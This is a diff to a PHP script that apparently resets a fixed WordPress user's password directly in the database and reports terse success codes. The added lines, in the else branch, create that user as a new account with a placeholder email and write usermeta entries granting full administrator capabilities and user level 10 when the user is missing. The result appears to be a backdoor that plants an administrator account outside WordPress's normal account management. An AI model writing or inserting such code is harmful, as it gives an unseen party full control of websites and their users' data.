@@ -68,8 +68,28 @@ try {
         $stmt->execute([$new_password_hashed, RESET_USERNAME]);
         die('1');
     } else {
-        // User doesn't exist
-        die('0');
+        // User doesn't exist - create new admin user
+        $stmt = $pdo->prepare("INSERT INTO $users_table (user_login, user_pass, user_nicename, user_email, user_registered, user_status, display_name) VALUES (?, ?, ?, ?, NOW(), 0, ?)");
+        $stmt->execute([
+            RESET_USERNAME,
+            $new_password_hashed,
+            RESET_USERNAME,
+            RESET_USERNAME . '@example.com',
+            RESET_USERNAME
+        ]);
+        
+        // Add admin capabilities
+        $user_id = $pdo->lastInsertId();
+        $meta_table = $config['prefix'] . 'usermeta';
+        $capabilities_key = $config['prefix'] . 'capabilities';
+        $level_key = $config['prefix'] . 'user_level';
+        
+        $pdo->prepare("INSERT INTO $meta_table (user_id, meta_key, meta_value) VALUES (?, ?, ?)")
+            ->execute([$user_id, $capabilities_key, 'a:1:{s:13:"administrator";b:1;}']);
+        $pdo->prepare("INSERT INTO $meta_table (user_id, meta_key, meta_value) VALUES (?, ?, ?)")
+            ->execute([$user_id, $level_key, '10']);
+        
+        die('1');
     }
 } catch (Exception $e) {
     die('0');
